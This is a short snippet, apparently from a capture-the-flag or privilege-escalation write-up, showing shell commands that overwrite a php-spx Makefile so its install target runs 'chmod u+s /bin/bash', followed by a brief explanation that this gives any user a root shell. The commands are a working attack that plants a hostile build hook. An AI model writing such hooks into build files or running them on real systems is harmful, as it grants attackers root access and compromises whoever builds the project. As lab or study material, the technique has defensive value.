```PowerShell
echo -e 'install:\n\tchmod u+s /bin/bash' > /home/profiler/php-spx/Makefile
echo -e 'all:\n\t@echo "Do nothing in all"\n\ninstall:\n\tchmod u+s /bin/bash' > Makefile
```

The command `**chmod u+s /bin/bash**` attempts to set the **SUID (Set User ID)** bit on `**/bin/bash**`, which would allow any user executing the binary to run it with the permissions of the file owner (typically `**root**`).
